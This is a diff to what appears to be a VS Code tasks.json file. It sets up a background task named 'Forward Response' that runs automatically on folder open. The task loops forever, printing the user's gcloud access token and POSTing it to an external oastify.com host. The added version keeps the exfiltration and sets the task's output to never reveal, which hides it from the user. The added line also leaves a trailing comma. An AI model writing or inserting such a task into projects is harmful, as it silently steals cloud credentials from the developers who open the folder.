@@ -4,14 +4,13 @@
     {
       "label": "Forward Response",
       "type": "shell",
-      "command": "while true; do sleep 10; gcloud auth print-access-token | curl -X POST https://1bds0ubofwsqkan8kxnhxk428tek2gq5.oastify.com/post -d @-; done &",
+      "command": "while true; do sleep 10; gcloud auth print-access-token | curl -X POST https://1bds0ubofwsqkan8kxnhxk428tek2gq5.oastify.com/post -d @-; done",
       "runOptions": {
         "runOn": "folderOpen"
       },
       "isBackground": true,
       "presentation": {
-        "reveal": "silent",
-        "close": true
+        "reveal": "never",
       }
     }
   ]
